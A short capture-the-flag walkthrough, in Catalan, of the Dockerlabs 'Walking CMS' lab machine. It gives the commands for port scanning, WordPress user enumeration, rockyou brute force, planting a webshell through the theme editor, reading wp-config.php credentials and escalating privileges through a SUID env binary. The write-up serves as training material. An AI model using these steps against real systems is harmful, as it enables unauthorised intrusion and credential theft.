# Walking CMS

Plataforma: Dockerlabs
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 5 de diciembre de 2024 21:36

### NMAP

```bash
sudo nmap -p- -sS -vvv  -n -Pn 172.17.0.2 -oG allports
```

![image.png](<imagenes/image 39.png>)

![image.png](<imagenes/image 40.png>)

Gobuster per trobar directoris :

```bash
gobuster dir -u [http://172.17.0.2](http://172.17.0.2/) -w /usr/share/wordlists/dirb/common.txt
```

![image.png](<imagenes/image 41.png>)

Es un wordpress. Enumerem usuaris :

```bash
sudo wpscan --url [http://172.17.0.2/wordpress](http://172.17.0.2/wordpress) --enumerate u
```

![image.png](<imagenes/image 42.png>)

Usuari : mario

Busquem password amb :

```bash
sudo wpscan --url [http://172.17.0.2/wordpress](http://172.17.0.2/wordpress) -P /usr/share/wordlists/rockyou.txt
```

![image.png](<imagenes/image 43.png>)

Password: l***


Entrem al wp-admin amb les credencials
entrem al editor de themes i creem un nou com a test.php amb la webshell:

![image.png](<imagenes/image 44.png>)

Ens posen a l'espera i executem la webshell:

![image.png](<imagenes/image 45.png>)

Mire fitxer wp-config.php

Database: username: wordpressuser

Data base password: t****************S

Tractament TTY:

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Busquem permisos:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Explotem env:

```java
env /bin/sh -p

```

![image.png](<imagenes/image 46.png>)